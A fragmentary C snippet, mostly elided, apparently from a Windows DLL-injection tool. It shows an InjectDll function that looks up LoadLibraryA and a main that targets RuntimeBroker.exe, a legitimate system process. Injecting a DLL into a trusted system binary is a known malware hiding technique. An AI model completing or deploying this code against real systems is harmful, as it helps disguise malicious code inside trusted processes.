...
#include <windows.h>// Para PathRemoveFileSpecA
...
BOOL InjectDll(HANDLE hProcess, HANDLE hThread, const TCHAR* path)
{
	...
	LoadLibraryA_t pLoadLibrary = (LoadLibraryA_t)GetProcAddress(hmodule, "LoadLibraryA");
...
int main(int argc, char* argv[])
{
	...
	TCHAR cmdline[] = _T("C:\\Windows\\System32\\RuntimeBroker.exe");
